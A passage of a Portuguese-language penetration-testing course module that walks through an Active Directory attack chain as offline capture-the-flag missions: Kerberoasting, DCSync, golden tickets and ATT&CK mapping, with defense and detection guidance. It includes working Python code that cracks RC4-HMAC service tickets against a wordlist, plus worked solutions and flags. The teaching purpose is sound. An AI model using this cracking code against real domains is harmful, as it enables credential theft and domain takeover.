+cipher = cf2f3ce9489675054103fa9b122cf756cc05a0e5307669c20654bf7ad188752b88ba119d09bc27719efab7b111a057d8a3c7283bc56598918bcce991f1ac931a5b89fa21fa7a1600ffb8a3b5acc2a138c720af25a81a63a7fce31bed21b3181e259ffd3f0ece4d846e92fe531ffecf7eef4307013ff45d7f3a6338ea2e9f379ebe820bce4ade74dd77c1c4eadf478a010e435835f10f7274acbe5c0209772fbb3a4759355fbce48cc132bda58c2244ab162e9b
+DOC
+
+# Missao 3: eventos da campanha, embaralhados, para ordenar e mapear ao ATT&CK.
+cat > m3-report.json <<'DOC'
+{
+  "events": [
+    { "id": "E5", "desc": "Pedir o TGS da conta de servico e quebrar a senha offline" },
+    { "id": "E1", "desc": "Login inicial na rede com um par usuario/senha de dominio valido (sem privilegio)" },
+    { "id": "E8", "desc": "Forjar um golden ticket para persistir como Domain Admin" },
+    { "id": "E3", "desc": "Mapear as relacoes de confianca entre dominios" },
+    { "id": "E6", "desc": "Reutilizar a credencial para executar em outro host via SMB (PsExec)" },
+    { "id": "E4", "desc": "Levantar grupos e permissoes (BloodHound) ate Domain Admins" },
+    { "id": "E2", "desc": "Listar contas e SPNs do dominio via LDAP / net user /domain" },
+    { "id": "E7", "desc": "Replicar os segredos do DC e extrair o hash do krbtgt" }
+  ],
+  "techniques_available": ["T1003.006","T1021.002","T1069.002","T1078","T1087.002","T1482","T1558.001","T1558.002","T1558.003","T1550.003"],
+  "cipher": "91de57a952889cc0236b2de1016d0a57ff2524a33f71f730485ea498541e00011d19f3be6fd0cec484fb272190bd564a9d2160629577d72f5fda928f136bafe9ed54dffcb2c9af02"
+}
+DOC
+
+echo "artefatos prontos em $ROOT"; ls -1 "$ROOT"
+```
+
+Agora salve o núcleo criptográfico — o mesmo `MD4` + RC4 + HMAC-MD5 do 7.3/7.4 (o `hashlib` moderno não traz mais o `MD4`). **Salve como `krb.py` dentro de `/tmp/ad-miniprojeto`:**
+
+```python
+import struct, hmac, hashlib
+
+def md4(msg):
+    def F(x, y, z): return (x & y) | (~x & z)
+    def G(x, y, z): return (x & y) | (x & z) | (y & z)
+    def H(x, y, z): return x ^ y ^ z
+    def lr(x, s):
+        x &= 0xFFFFFFFF
+        return ((x << s) | (x >> (32 - s))) & 0xFFFFFFFF
+    msg = bytearray(msg); ln = (8 * len(msg)) & 0xFFFFFFFFFFFFFFFF
+    msg.append(0x80)
+    while len(msg) % 64 != 56: msg.append(0)
+    msg += struct.pack("<Q", ln)
+    a0, b0, c0, d0 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
+    for off in range(0, len(msg), 64):
+        X = struct.unpack("<16I", msg[off:off + 64]); a, b, c, d = a0, b0, c0, d0
+        for k, s in [(0,3),(1,7),(2,11),(3,19),(4,3),(5,7),(6,11),(7,19),
+                     (8,3),(9,7),(10,11),(11,19),(12,3),(13,7),(14,11),(15,19)]:
+            a, b, c, d = d, lr((a + F(b, c, d) + X[k]) & 0xFFFFFFFF, s), b, c
+        for k, s in [(0,3),(4,5),(8,9),(12,13),(1,3),(5,5),(9,9),(13,13),
+                     (2,3),(6,5),(10,9),(14,13),(3,3),(7,5),(11,9),(15,13)]:
+            a, b, c, d = d, lr((a + G(b, c, d) + X[k] + 0x5A827999) & 0xFFFFFFFF, s), b, c
+        for k, s in [(0,3),(8,9),(4,11),(12,15),(2,3),(10,9),(6,11),(14,15),
+                     (1,3),(9,9),(5,11),(13,15),(3,3),(11,9),(7,11),(15,15)]:
+            a, b, c, d = d, lr((a + H(b, c, d) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s), b, c
+        a0 = (a0 + a) & 0xFFFFFFFF; b0 = (b0 + b) & 0xFFFFFFFF
+        c0 = (c0 + c) & 0xFFFFFFFF; d0 = (d0 + d) & 0xFFFFFFFF
+    return struct.pack("<4I", a0, b0, c0, d0)
+
+def nt_hash(password):           # NT hash = MD4(UTF-16LE(senha))
+    return md4(password.encode("utf-16-le"))
+
+def rc4(key, data):
+    S = list(range(256)); j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) & 0xFF; S[i], S[j] = S[j], S[i]
+    out = bytearray(); i = j = 0
+    for ch in data:
+        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF; S[i], S[j] = S[j], S[i]
+        out.append(ch ^ S[(S[i] + S[j]) & 0xFF])
+    return bytes(out)
+
+def _hm(key, data):
+    return hmac.new(key, data, hashlib.md5).digest()
+
+def decrypt(key, usage, cipher):
+    # RC4-HMAC (etype 23), RFC 4757: checksum(16) + RC4(confounder(8)|dados)
+    k1 = _hm(key, struct.pack("<I", usage))
+    checksum, edata = cipher[:16], cipher[16:]
+    blob = rc4(_hm(k1, checksum), edata)
+    return blob[8:], _hm(k1, blob) == checksum
+```
+
+### 5.2 Missão 1 — achar o elo fraco (guiada)
+
+Você tem o `m1-enum.json`: cinco contas e dois fatos (de quais hosts cada conta é admin local, e em quais hosts há sessão de conta privilegiada). Seu objetivo é achar a **única** conta que serve de elo fraco — aquela que satisfaz os **dois** critérios ao mesmo tempo:
+
+1. é **Kerberoastável**: conta de **usuário** (`sAMAccountType` 805306368, não 805306369 de computador), com `servicePrincipalName` preenchido, e **habilitada** (sem o bit `0x2` no `userAccountControl`);
+2. está num **caminho privilegiado**: é admin local de um host onde há sessão de uma conta privilegiada (que você poderia roubar).
+
+A nota (base64) da conta certa é a flag. As notas das iscas começam com `decoy:`.
+
+```console
+$ cd /tmp/ad-miniprojeto
+$ python3 - <<'PY'
+import json, base64
+d = json.load(open("m1-enum.json"))
+adm = d["facts"]["local_admin_of"]; sess = d["facts"]["privileged_sessions"]
+for a in d["accounts"]:
+    user = a["type"] == 805306368
+    enabled = (int(a["uac"], 16) & 0x2) == 0
+    roastable = user and bool(a["spn"]) and enabled
+    on_path = any(h in sess for h in adm.get(a["sam"], []))
+    print(f'{a["sam"]:11} roastable={roastable!s:5} on_priv_path={on_path!s:5}',
+          "<== ALVO" if roastable and on_path else "")
+PY
+svc_backup  roastable=True  on_priv_path=True  <== ALVO
+svc_web     roastable=True  on_priv_path=False
+svc_old     roastable=False on_priv_path=False
+WS-FS$      roastable=False on_priv_path=False
+j.silva     roastable=False on_priv_path=False
+```
+
+`svc_backup` é o elo fraco: roastável **e** admin local de `WS-FS`, onde `h.santos` (de `Server-Admins`) tem sessão. `svc_web` é roastável mas não leva a lugar nenhum (beco sem saída); `svc_old` está desabilitada; `WS-FS$` é conta de computador; `j.silva` não tem SPN. Decodifique a nota da conta certa — ela é a flag:
+
+```console
+$ python3 -c "
+import json, base64
+d = json.load(open('m1-enum.json'))
+a = next(x for x in d['accounts'] if x['sam'] == 'svc_backup')
+print(base64.b64decode(a['note']).decode())
+"
+FLAG{...}
+```
+
+<FlagInput task="missao-1-elo-fraco" />
+
+### 5.3 Missão 2 — executar a cadeia até o krbtgt (desafio)
+
+Agora a parte de ataque, encadeada. São três elos, e cada um destrava o próximo:
+
+1. **Kerberoasting:** quebre o TGS de `svc_backup` (`m2-tgs.txt`) usando a wordlist. A senha certa é a que faz o checksum do RC4-HMAC fechar (key usage **2**).
+2. **Abrir o cofre:** o `m2-vault.enc` é o loot que você capturaria após mover-se para `WS-FS` — RC4 puro, cifrado com o **NT hash** da senha que você acabou de quebrar. Decifre e leia o hash do krbtgt lá dentro.
+3. **Forjar o golden:** o `m2-golden.enc` é a parte cifrada de um TGT forjado com o hash do krbtgt. Decifre com esse hash (key usage **2**, a do enc-part do ticket, igual ao 7.4). A flag está no conteúdo.
+
+<Hint title="Dica 1 — o crack">
+Para o Kerberoasting, varra a wordlist: para cada senha, `nt = krb.nt_hash(senha)`, e tente `krb.decrypt(nt, 2, cipher)`. O segundo valor devolvido é `True` quando o checksum fecha — aí você achou a senha e tem o NT hash dela. É o mesmo princípio do 7.3, só que aqui o alvo é uma conta que você já sabe que importa (Missão 1).
+</Hint>
+
+<Hint title="Dica 2 — a corrente completa">
+Salve este `roast.py` (quebra o TGS) e rode os três passos em sequência:
+
+```python
+import sys, krb
+spn = cipher = None
+for line in open("m2-tgs.txt"):
+    if line.startswith("spn ="): spn = line.split("=", 1)[1].strip()
+    if line.startswith("cipher ="): cipher = bytes.fromhex(line.split("=", 1)[1].strip())
+for pw in open("m2-wordlist.txt"):
+    pw = pw.rstrip("\n")
+    plain, ok = krb.decrypt(krb.nt_hash(pw), 2, cipher)   # TGS enc-part = key usage 2
+    if ok:
+        print("senha:", pw, "| NT hash:", krb.nt_hash(pw).hex())
+        break
+```
+</Hint>
+
+<Solution title="Solução">
+Os três elos, em ordem:
+
+```console
+$ python3 roast.py
+senha: Autumn2023! | NT hash: 805bd85ee21a69fdbea7f24e14b8e11e
+
+$ python3 -c "
+import krb, json
+nt = krb.nt_hash('Autumn2023!')
+data = krb.rc4(nt, bytes.fromhex(open('m2-vault.enc').read().split()[-1]))
+print(json.loads(data)['krbtgt_nt_hash'])
+"
+b4f3e2a9c7d61508e2f94a3b7c6d5e01
+
+$ python3 -c "
+import krb
+cipher = next(l.split('=',1)[1].strip() for l in open('m2-golden.enc') if l.startswith('cipher ='))
+plain, ok = krb.decrypt(bytes.fromhex('b4f3e2a9c7d61508e2f94a3b7c6d5e01'), 2, bytes.fromhex(cipher))
+print('checksum OK:', ok); print(plain.decode())
+"
+checksum OK: True
+client=Administrator@CORP.LOCAL rid=500 groups=512(Domain Admins),519(Enterprise Admins),513 FLAG{...}
+```
+
+A senha fraca de uma conta de serviço (quebrada offline) abriu o cofre de credenciais; dentro dele, o hash do krbtgt; com ele, o golden ticket que afirma ser o `Administrator`, membro de `512` (Domain Admins). **Ninguém autorizou isso** — a identidade foi forjada no <GlossaryTerm term="PAC">PAC</GlossaryTerm> e cifrada com a chave do krbtgt. A flag estava no conteúdo do ticket.
+</Solution>
+
+<FlagInput task="missao-2-cadeia" />
+
+### 5.4 Missão 3 — documentar o caminho (desafio)
+
+Você comprometeu o domínio. Falta a parte que entrega valor: o **relatório**. O `m3-report.json` traz os 8 eventos da campanha **embaralhados**. Seu objetivo: colocá-los na ordem cronológica do ataque e mapear cada um ao **ID MITRE ATT&CK** correto. Monte o `m3-answer.txt` com um ID por linha, na ordem cronológica, e rode o `report.py`: ele só decifra uma flag legível se a **ordem** E o **mapeamento** estiverem certos.
+
+<Hint title="Dica 1 — a ordem">
+A ordem é a da cadeia que você estudou e acabou de executar: foothold (credencial válida) → listar contas/SPNs → mapear trusts → mapear grupos e caminhos → Kerberoasting → movimento lateral por SMB → DCSync → golden ticket. Olhe a descrição de cada evento `E1..E8` e reordene.
+</Hint>
+
+<Hint title="Dica 2 — o mapeamento">
+Cada passo tem uma página no `attack.mitre.org`. Os que você vai usar: `T1078` (Valid Accounts), `T1087.002` (Account Discovery: Domain Account), `T1482` (Domain Trust Discovery), `T1069.002` (Permission Groups Discovery: Domain Groups), `T1558.003` (Kerberoasting), `T1021.002` (SMB/Windows Admin Shares), `T1003.006` (DCSync), `T1558.001` (Golden Ticket). Cuidado para não trocar `T1558.001` (Golden) por `T1558.002` (Silver) nem por `T1558.003` (Kerberoasting). Salve o `report.py`:
+
+```python
+import sys, json, hashlib
+data = json.load(open("m3-report.json"))
+ids = [l.strip() for l in open(sys.argv[1]) if l.strip()]
+ks = hashlib.sha256("|".join(ids).encode()).digest()
+stream = b""; i = 0; cipher = bytes.fromhex(data["cipher"])
+while len(stream) < len(cipher):
+    stream += hashlib.sha256(ks + i.to_bytes(2, "big")).digest(); i += 1
+out = bytes(a ^ b for a, b in zip(cipher, stream))
+try: print(out.decode())
+except UnicodeDecodeError: print("[-] ordem/mapeamento incorretos: nao decifra")
+```
+</Hint>
+
+<Solution title="Solução">
+A ordem cronológica e os IDs:
+
+```console
+$ cat > m3-answer.txt <<'EOF'
+T1078
+T1087.002
+T1482
+T1069.002
+T1558.003
+T1021.002
+T1003.006
+T1558.001
+EOF
+$ python3 report.py m3-answer.txt
+FLAG{...}
+```
+
+Se você errar a ordem ou um ID, o `report.py` não decifra nada legível — porque a chave de decifragem **é** a sequência correta de técnicas. Essa é a lição: um relatório só vale se a narrativa fecha. A linha do tempo ordenada + o mapa ATT&CK são o produto final do pentest, a ponte direta para a Trilha 8 (consolidação e relatório).
+</Solution>
+
+<FlagInput task="missao-3-relatorio" />
+
+Quando terminar, as três flags entram nos cartões e o quiz da seção 9 fecha o módulo. Nenhum lab para desligar — você só gerou arquivos no `/tmp`.
+
+## 6. Variações e aprofundamento
+
+**O mesmo mapa, com AES em vez de RC4.** A cadeia que você montou se apoia no atalho do <GlossaryTerm term="RC4-HMAC (etype 23)">RC4-HMAC etype 23</GlossaryTerm>, em que a chave do ticket é o próprio NT hash. Em domínios que forçam AES (etypes 17/18), o Kerberoasting ainda existe, mas a quebra é muito mais lenta, e golden/silver tickets precisam da chave AES (não do NT hash). O esqueleto da cadeia é o mesmo; muda o custo de cada elo.
+
+**Diamond ticket: o golden que não levanta suspeita.** O golden ticket "clássico" forja o <GlossaryTerm term="PAC">PAC</GlossaryTerm> do zero, deixando inconsistências que defensores caçam. O <GlossaryTerm term="diamond ticket">diamond ticket</GlossaryTerm> é a evolução furtiva: o atacante pede um TGT **legítimo** ao <GlossaryTerm term="KDC">KDC</GlossaryTerm> e só modifica o PAC dele, recifrando com a chave do krbtgt — um ticket quase idêntico aos reais. Quando a detecção aperta, a cadeia se adapta aqui.
+
+**Pular de domínio: trusts e SID history.** Em florestas com vários domínios, comprometer um não encerra o jogo: as relações de <GlossaryTerm term="domain trust">domain trust</GlossaryTerm> (7.2) permitem atravessar para outro, às vezes com um golden ticket "entre domínios" que injeta, via <GlossaryTerm term="SID history">SID history</GlossaryTerm>, o SID de um grupo privilegiado do domínio vizinho. É como uma floresta inteira cai a partir de um elo.
+
+**Delegação (RBCD) como atalho de escalação.** Há uma família de ataques de delegação Kerberos (unconstrained, constrained, resource-based constrained delegation) em que uma conta configurada para "agir em nome de outros" é abusada para virar Domain Admin sem passar pelo krbtgt. O BloodHound marca essas arestas (`AllowedToAct`); num engajamento real, elas às vezes encurtam o mapa da seção 2.
+
+**Black-box × assume breach.** O mini-projeto assume um foothold (a conta de `j.silva` já em mãos). Num teste *black-box*, a fase anterior — conseguir a primeira credencial (phishing, password spraying, um serviço exposto) — é parte do trabalho. Muitos engajamentos modernos, porém, começam **assumindo o breach** (a organização entrega um foothold de propósito), justamente para testar a contenção da cadeia, não o perímetro.
+
+## 7. Erros comuns
+
+- **Atacar a conta roastável errada.** Quebrar a senha de `svc_web` porque "era roastável" e travar: ela não leva a lugar nenhum. O erro é não cruzar com o caminho (Missão 1). Sempre pergunte "depois de quebrar isto, para onde vou?".
+- **`roast.py` não acha a senha:** confira se copiou o `cipher` inteiro (é uma linha longa) e se está usando **key usage 2**. Com o hex truncado ou a usage errada, nenhuma senha fecha o checksum.
+- **Confundir a key usage:** tanto o TGS (Missão 2.1) quanto o enc-part do golden (Missão 2.3) usam usage **2**; o AS-REP do 7.3 era 8. Errar a usage dá "checksum não fecha" mesmo com a chave certa.
+- **Abrir o vault com a senha, não com o hash:** o cofre é RC4 com chave = **NT hash** da senha (`krb.nt_hash(senha)`), não a senha em texto. Passar a string errada devolve lixo.
+- **Missão 3 "não decifra":** quase sempre é a **ordem** (dois passos trocados) ou um ID trocado (`T1558.001` × `.002` × `.003`). Como a chave é a sequência inteira, um único erro embaralha tudo — reordene com calma e confira cada técnica na página do ATT&CK.
+- **Documentar "de cabeça" depois.** No mundo real, reconstruir a timeline no fim, de memória, perde horários e passos. Anote **enquanto** ataca (como em 1.5) — a Missão 3 simula justamente a dor de reconstruir uma cadeia fora de ordem.
+
+## 8. Defesa e mitigação
+
+A lição central da defesa aqui decorre direto da teoria: como o comprometimento é uma **cadeia de reutilização de identidade**, não existe um único controle que impeça tudo — mas **quebrar qualquer elo quebra a campanha**. A defesa madura, portanto, é em profundidade: coloca um corte em cada estágio do mapa da seção 2, de modo que o atacante precise vencer todos, enquanto o defensor precisa vencer só um.
+
+<Figure
+  src={aCadeiaESeusCortes}
+  alt="Seis elos da cadeia, um por linha, cada um ligado por uma seta à defesa que o quebra. Elo 1 foothold (credencial roubada): cortado por MFA e senhas fortes. Elo 2 enumeracao (le o diretorio por desenho): tiering reduz o valor do que se ve e deteccao de leitura anomala, ja que nao da para desligar a leitura sem quebrar o dominio. Elo 3 Kerberoasting: cortado por gMSA com senha longa e rotacionada e por forcar AES. Elo 4 movimento lateral: cortado por LAPS, Protected Users e restringir o ADMIN$, de modo que o hash de uma maquina nao abre as outras. Elo 5 DCSync: detectado pelo evento 4662 quando a replicacao vem de uma conta que nao e controlador. Elo 6 golden ticket: cortado pela rotacao dupla da senha do krbtgt, que expurga a chave roubada. A faixa final: quebrar um elo quebra a cadeia inteira."
+  caption="A defesa em profundidade: um corte por elo. O atacante precisa vencer todos; o defensor, só um."
+/>
+
+**Elo 3 — matar o Kerberoasting (a credential access):**
+
+- Use **gMSA** (<GlossaryTerm term="gMSA">group Managed Service Accounts</GlossaryTerm>) nas contas de serviço: a senha passa a ter 120+ caracteres aleatórios, rotacionada automaticamente, o que torna a quebra offline inviável. É a defesa que teria tornado `svc_backup` inútil para o atacante. Force também **AES** e desabilite o RC4 nos tickets (por política), tirando o atalho criptográfico do 7.3.
+
+**Elo 4 — matar o movimento lateral (a reutilização):**
+
+- **LAPS** (Local Administrator Password Solution): cada máquina ganha uma senha de administrador local **única e rotacionada**; o hash roubado de uma estação não abre as outras — exatamente o que faz o pass-the-hash voar numa rede plana.
+- Coloque as contas sensíveis no grupo <GlossaryTerm term="Protected Users">Protected Users</GlossaryTerm> (que bloqueia NTLM e RC4 para elas) e **restrinja os compartilhamentos administrativos** (`ADMIN$`, `C$`) e o uso de contas de serviço como admin local em massa.
+
+**Elos 1 e 5 — a chave-mestra e a administração em camadas:**
+
+- **Administração em camadas (<GlossaryTerm term="tiering">tiering</GlossaryTerm>) e estações dedicadas (<GlossaryTerm term="PAW">PAW</GlossaryTerm>).** Nunca use uma conta de Tier 0 (Domain Admin) para logar numa estação comum: é isso que deixa a **sessão privilegiada** que o atacante rouba no movimento lateral (o `h.santos` em `WS-FS` da Missão 1). Contas de Tier 0 só tocam sistemas de Tier 0.
+
+**Elo 6 — invalidar o golden ticket:**
+
+- **Rotacione a senha do krbtgt periodicamente e, após qualquer suspeita de comprometimento de controlador, duas vezes**, com intervalo de **pelo menos 10 horas**. A Microsoft é explícita: *"resetting the password twice ... invalidates existing Kerberos tickets to help prevent Golden Ticket attacks"*. O krbtgt guarda as duas senhas mais recentes; um reset só deixa a chave roubada ainda válida, o segundo a expurga. Resetar uma vez só é o erro clássico de resposta a incidente.
+
+**Detectar quem ataca (escutar a cadeia):**
+
+- **DCSync anômalo:** monitore o evento `4662` com a máscara de acesso `0x100` referenciando as GUIDs de replicação `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` e `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` **vindo de uma conta que não é um controlador de domínio**. Replicação pedida por quem não é DC é, por definição, suspeita.
+- **Movimento lateral e tickets:** criação de serviço remoto (`7045`, assinatura do PsExec), logons de rede (`4624` LogonType 3) em rajada, e golden/silver tickets com tempos de vida absurdos ou um `4624` em serviço **sem** o `4768`/`4769` correspondente.
+- **Rode o BloodHound pela defesa:** o mesmo grafo que acha o caminho curto até Tier 0 serve para o defensor cortá-lo **antes** do atacante. É a materialização do <GlossaryTerm term="assume breach">assume breach</GlossaryTerm>: trabalhar supondo que o inimigo já tem um foothold.
+
+## 9. Exercícios
+
+Responda ao quiz abaixo (ele conta para concluir o módulo) e complete as três missões da seção 5 — cada uma entrega uma flag.
+
+<Quiz task="quiz-final" />
+
+**Desafios extras (sem flag, para fixar):**
+
+- Reescreva a Missão 3 como um parágrafo de relatório para o cliente: em 4 a 6 frases, conte a cadeia na ordem, citando a técnica ATT&CK de cada passo e **uma** mitigação por passo. Esse é, literalmente, o entregável de um pentest.
+- Na Missão 1, `svc_web` é roastável mas foi descartada. Descreva um cenário em que ela **passaria** a ser o elo fraco (dica: pense no que precisaria mudar em `local_admin_of` ou `privileged_sessions`).
+- Explique, em duas frases, por que forçar AES no domínio encarece **dois** elos diferentes do seu mapa ao mesmo tempo.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Comprometer um domínio é uma **cadeia de reutilização de identidade**, não um exploit único: foothold → enumeração → Kerberoasting → movimento lateral → DCSync → golden ticket.
+- Enumeração, ataque e escalação são **o mesmo grafo** lido de ângulos diferentes; o elo fraco se acha **cruzando** dados (quem é roastável × quem leva a um caminho privilegiado), não atacando às cegas.
+- A cadeia de decifragem offline (quebrar o TGS → abrir o cofre com o NT hash → forjar o golden com o hash do krbtgt, tudo em key usage 2) reproduz a matemática real do Kerberos que você viu em 7.3/7.4.
+- **Documentar é parte do ataque:** a linha do tempo ordenada e o mapa MITRE ATT&CK são o produto final do pentest — reprodutibilidade, priorização e cadeia de custódia.
+- Defesa **em profundidade**: um corte por elo (gMSA, LAPS, Protected Users, tiering/PAW, rotação dupla do krbtgt, detecção pelo 4662/4769/7045). Quebrar um elo quebra a cadeia.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [CISA — #StopRansomware: Akira Ransomware (AA24-109A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a) — a cadeia deste módulo (Kerberoasting, Mimikatz, enumeração de trusts, extração do NTDS.dit) num alerta oficial, com mitigações mapeadas.
+- [MITRE ATT&CK — T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/), [T1003.006 DCSync](https://attack.mitre.org/techniques/T1003/006/), [T1558.001 Golden Ticket](https://attack.mitre.org/techniques/T1558/001/), [T1087.002 Account Discovery](https://attack.mitre.org/techniques/T1087/002/) e [T1482 Domain Trust Discovery](https://attack.mitre.org/techniques/T1482/) — as técnicas da cadeia, com detecção e mitigação.
+- [Microsoft Learn — Reset the krbtgt password (forest recovery)](https://learn.microsoft.com/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password) — por que resetar o krbtgt duas vezes, com 10 horas de intervalo.
